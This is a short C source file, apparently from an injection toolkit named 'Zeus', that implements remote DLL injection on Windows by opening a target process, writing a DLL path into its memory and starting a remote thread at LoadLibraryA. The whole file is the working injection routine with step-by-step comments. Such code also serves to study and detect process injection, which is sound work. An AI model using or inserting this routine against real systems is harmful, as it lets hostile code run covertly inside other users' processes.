/*
* ZeusCreateRemoteThreadProc.c : This file contains
* zeus project's implementation of remote dll injection
* by utilising CreateRemoteThread API. 
*
* Note : This Technique may not work on Windows 7-8 And Above
*
* Written By : @Ice3man
* Email : EthanTom543@gmail.com
* 
* (C) Ice3man
*/

/* 
* NOTE : 
*	We don't actually write all dll code into the process memory.
* We just write the dll's location and use LoadLibrary to 
* map it dynamically.
*
* if you want, you can implement it yourself.
*/

#include "Zeus.h"

/*
* Creates a Remote Thread in the process by using CreateRemoteThread
* Windows API.
*	
* Args :
*	@ProcID : The Process ID To Be Injected
*	@szDllLoc : The Location of the Dll To be Injected
*
* Return Value :
*	@FALSE : If Failed
*	@TRUE : if Succeed
*/
int ZeusCreateRemoteThread(int ProcID, char *szDllLoc)
{
	/*
	* At first, we acquire a handle to the process.
	* Next, we load the address of LoadLibrary.
	* We allocate some memory for the name of Dll string in
	* remote process. Afterwords, we write the dll's location
	* and then create a remote thread in target process passing
	* address of LoadLibrary. Address of location of Dll is passed
	* as parameter.
	*/
	
	HANDLE hProcess = ZeusOpenProcess(ProcID);
	LPVOID arg = ZeusWriteDllStrMemory(szDllLoc, hProcess);

	LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
	if (addr == NULL)
	{
#ifdef _DEBUG_
		printf("\n[!] Error : Could not get Library Address !");
#endif
		ExitProcess(1);
	}
	printf("\n[+] Got Address Of LoadLibraryA Successfully !");
	

	HANDLE threadID = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, arg, 0, NULL);
	if(threadID==NULL)
	{
#ifdef _DEBUG_
		printf("\n[!] Error : Could not create remote thread !");
#endif
		ExitProcess(1);
	}
	else {
		/*
		* Creating a remote thread succeeded.
		*/
		printf("\n[+] Successfully Created Remote Thread !");
		CloseHandle(hProcess);
		ExitProcess(0);
	}
	CloseHandle(hProcess);
}